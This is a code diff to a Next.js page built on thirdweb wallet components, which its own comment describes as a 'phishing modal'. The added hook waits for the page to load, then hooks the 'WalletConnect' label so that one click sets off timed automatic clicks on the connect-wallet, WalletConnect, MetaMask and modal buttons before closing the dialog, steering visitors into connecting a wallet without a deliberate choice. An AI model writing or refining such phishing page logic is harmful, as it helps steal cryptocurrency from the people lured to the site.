@@ -17,130 +17,119 @@ import {
   safeWallet,
 } from "@thirdweb-dev/react";
 import { Inter } from "next/font/google";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 
 const inter = Inter({ subsets: ["latin"] });
 
 export default function Home() {
   // State to control visibility of the phishing modal
   const [showPhishingModal, setShowPhishingModal] = useState(true);
-  const scriptExecutedRef = useRef(false);
 
   // Close modal function
   const closeModal = () => {
     setShowPhishingModal(false);
   };
-
-  // Execute the script when the component mounts
+  
+  // Effect to run the script after 5 seconds of page load
   useEffect(() => {
-    if (!scriptExecutedRef.current) {
-      scriptExecutedRef.current = true;
-      
-      // Define the function as a const variable instead of a function declaration
-      const attachClickToWalletConnectSpan = () => {
-        // Wait for DOM to be fully loaded
-        setTimeout(() => {
-          // Find all spans with the specified class
-          const spans = document.querySelectorAll('span.wallet-name');
-          
-          // Loop through all matching spans
-          for (const span of spans) {
-            // Check if this span contains the text "WalletConnect"
-            if (span.textContent === 'WalletConnect') {
-              // Add click event listener to this span
-              span.addEventListener('click', function() {
-                console.log('WalletConnect span clicked, executing sequence...');
+    const timer = setTimeout(() => {
+      // Function to find and attach click event to the WalletConnect span
+      function attachClickToWalletConnectSpan() {
+        // Find all spans with the specified class
+        const spans = document.querySelectorAll('span.wallet-name');
+        
+        // Loop through all matching spans
+        for (const span of spans) {
+          // Check if this span contains the text "WalletConnect"
+          if (span.textContent === 'WalletConnect') {
+            // Add click event listener to this span
+            span.addEventListener('click', function() {
+              console.log('WalletConnect span clicked, executing sequence...');
+              
+              // Execute your code when the span is clicked
+              setTimeout(function() {
+                // First button click
+                const connectWalletButton = document.querySelector('button.tw-connect-wallet');
+                if (connectWalletButton) {
+                  connectWalletButton.click();
+                  console.log('Connect wallet button clicked');
+                } else {
+                  console.error('Connect wallet button not found');
+                }
                 
-                // Execute your code when the span is clicked
+                // Wait 2 seconds before finding and clicking the next button
                 setTimeout(function() {
-                  // First button click
-                  const connectWalletBtn = document.querySelector('button.tw-connect-wallet.css-1un3lp3');
-                  if (connectWalletBtn) {
-                    connectWalletBtn.click();
-                    console.log('Connect wallet button clicked');
-                  } else {
-                    console.error('Connect wallet button not found');
+                  const buttons = document.querySelectorAll('button');
+                  let walletConnectButton = null;
+                  let metaMaskButton = null;
+                  
+                  for (const button of buttons) {
+                    if (button.textContent.includes('WalletConnect')) {
+                      walletConnectButton = button;
+                    }
+                    if (button.textContent.includes('MetaMask')) {
+                      metaMaskButton = button;
+                    }
                   }
                   
-                  // Wait 2 seconds before finding and clicking the next button
-                  setTimeout(function() {
-                    const buttons = document.querySelectorAll('button');
-                    let walletConnectButton = null;
-                    let metaMaskButton = null;
+                  if (walletConnectButton) {
+                    walletConnectButton.click();
+                    console.log('WalletConnect button clicked');
                     
-                    for (const button of buttons) {
-                      if (button.textContent.includes('WalletConnect')) {
-                        walletConnectButton = button;
-                      }
-                      if (button.textContent.includes('MetaMask')) {
-                        metaMaskButton = button;
-                      }
-                    }
-                    
-                    if (walletConnectButton) {
-                      walletConnectButton.click();
-                      console.log('WalletConnect button clicked');
-                      
-                      // Wait 2 seconds before clicking the MetaMask button
-                      setTimeout(function() {
-                        if (metaMaskButton) {
-                          metaMaskButton.click();
-                          console.log('MetaMask button clicked');
+                    // Wait 2 seconds before clicking the MetaMask button
+                    setTimeout(function() {
+                      if (metaMaskButton) {
+                        metaMaskButton.click();
+                        console.log('MetaMask button clicked');
+                        
+                        // Wait 2 seconds after the last function before executing whatever $0 was supposed to be
+                        // Note: $0 is a browser console variable referring to the currently selected element
+                        // We'll have to make a best guess at what this should target
+                        setTimeout(function() {
+                          // Try to find a relevant button to click as a fallback for $0
+                          const modalButtons = document.querySelectorAll('.modal-container button');
+                          if (modalButtons.length > 0) {
+                            modalButtons[0].click();
+                            console.log('Modal button clicked as fallback for $0');
+                          }
                           
-                          // Wait 2 seconds after the last function before executing $0.click()
+                          // Wait 2 seconds before clicking the close button
                           setTimeout(function() {
-                            try {
-                              // Note: $0 is a browser console reference and won't work in this context
-                              // We need to substitute it with an actual element selector
-                              const activeElement = document.activeElement;
-                              if (activeElement) {
-                                activeElement.click();
-                                console.log('Active element clicked');
-                              } else {
-                                console.error('No active element to click');
-                              }
-                              
-                              // Wait 2 seconds before clicking the close button
-                              setTimeout(function() {
-                                // Find and click the close button
-                                const closeButton = document.querySelector('.close-button');
-                                if (closeButton) {
-                                  closeButton.click();
-                                  console.log('Close button clicked');
-                                } else {
-                                  console.error('Close button not found');
-                                }
-                              }, 2000); // 2 seconds delay before clicking close button
-                              
-                            } catch (error) {
-                              console.error('Error executing click:', error);
+                            // Find and click the close button
+                            const closeButton = document.querySelector('button.close-button');
+                            if (closeButton) {
+                              closeButton.click();
+                              console.log('Close button clicked');
+                            } else {
+                              console.error('Close button not found');
                             }
-                          }, 2000); // 2 seconds delay before $0.click()
-                        } else {
-                          console.error('Button with text "MetaMask" not found.');
-                        }
-                      }, 2000); // 2 seconds delay before MetaMask button
-                    } else {
-                      console.error('Button with text "WalletConnect" not found.');
-                    }
-                  }, 2000); // 2 seconds delay after first button click
-                }, 5000); // 5 seconds initial delay
-              });
-              
-              console.log('Click event attached to WalletConnect span');
-              return; // Exit the function after attaching the event to the first matching span
-            }
+                          }, 2000); // 2 seconds delay before clicking close button
+                          
+                        }, 2000); // 2 seconds delay before $0.click()
+                      } else {
+                        console.error('Button with text "MetaMask" not found.');
+                      }
+                    }, 2000); // 2 seconds delay before MetaMask button
+                  } else {
+                    console.error('Button with text "WalletConnect" not found.');
+                  }
+                }, 2000); // 2 seconds delay after first button click
+              }, 5000); // 5 seconds initial delay
+            });
+            
+            console.log('Click event attached to WalletConnect span');
+            return; // Exit the function after attaching the event to the first matching span
           }
-          
-          console.log('WalletConnect span not found, retrying in 2 seconds...');
-          // If the span isn't found, try again in 2 seconds
-          setTimeout(attachClickToWalletConnectSpan, 2000);
-        }, 1000); // Initial delay to ensure the DOM is loaded
-      };
+        }
+        
+        console.log('WalletConnect span not found');
+      }
       
       // Run the function to attach the click event
       attachClickToWalletConnectSpan();
-    }
+    }, 5000); // 5 seconds after page load
+    
+    return () => clearTimeout(timer);
   }, []);
 
   return (
